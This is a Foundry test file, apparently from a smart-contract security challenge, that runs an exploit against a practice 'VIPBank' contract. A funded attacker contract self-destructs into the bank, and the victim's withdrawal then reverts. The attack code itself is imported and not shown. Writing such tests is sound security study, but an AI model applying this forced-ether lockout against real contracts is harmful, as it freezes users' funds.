// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/VIPBank/VipBankAttacker.sol";
import "../src/VIPBank/VIPBank.sol";

contract VIPBankExploit is Test {
    address attacker;
    address wojak;
    address manager;
    VIPBank internal vipBank;
    VipBankAttacker internal vipAttacker;

    function setUp() public {
        //Characters
        manager = makeAddr("manager");
        attacker = makeAddr("attacker");
        wojak = makeAddr("wojak");
        // Characters labelling...
        vm.label(manager, "bogdanOff");
        vm.label(attacker, "chad");
        vm.label(wojak, "wojak");

        //

        //Equity
        vm.deal(attacker, 1 ether);
        vm.deal(wojak, 0.1 ether);
        //Bank contranct deployment by manager
        vm.startPrank(manager);
        vipBank = new VIPBank();
        vipBank.addVIP(wojak);
        vm.stopPrank();
        //
    }

    function testExploit() public {
        //wojak deposits 0.0001 ether
        vm.startPrank(wojak);
        vipBank.deposit{value: 0.0001 ether}();
        vm.stopPrank();
        //Attacker deployed AttackerContract
        vm.startPrank(attacker);
        vipAttacker = new VipBankAttacker();
        //Attacker transfered 1 ether to that contract
        (bool sucess, ) = address(vipAttacker).call{
            value: address(attacker).balance
        }("");
        require(sucess, "Call unsuccessful");
        //attacker destroyed the contract
        vipAttacker.attack(address(vipBank));
        vm.stopPrank();
        assertEq(vipBank.contractBalance(), 1.0001 ether);
        vm.startPrank(wojak);
        vm.expectRevert();
        vipBank.withdraw(0.0001 ether);
        vm.stopPrank();
        console.log(unicode"\n wojaküòø got rekt back to McDonaldsüçïüçî");
    }
}
